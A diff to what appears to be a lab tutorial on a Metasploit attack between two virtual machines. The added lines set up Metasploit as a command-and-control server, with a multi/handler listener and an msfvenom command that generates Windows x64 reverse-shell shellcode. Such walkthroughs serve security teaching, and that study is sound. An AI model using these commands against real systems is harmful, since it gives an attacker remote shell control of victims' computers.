@@ -17,11 +17,25 @@ If you want also want to perform this simple attack you will need to have to vir
   - Kali Linux or any other machine with metasploit on it (Attacker)
 
 
-# Steps
-
-## 1. Configuring your C2 (Command & Control)
+# Configuring your C2 (Command & Control)
 
 Now, I know some of you will say what is a C2 or why am I considering metasploit as C2. Well, let me explain in this case metasploit will act as a command and control center because it will be used to issue commands to the compromised system and also, to receive data from them. Now that the air is cleared let's proceed!
+
+- Start Metasploit Framework
+  ```
+  sudo service postgresql start && msfconsole -q
+  ```
+- Configure Listener
+  ```
+  use multi/handler
+  set LHOST <HOST>
+  set LPORT <PORT>
+  run
+  ```
+- Generate shellcode
+  ```
+  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<HOST> LPORT=<PORT> -f c -o <name>.c
+  ```
 
 
 
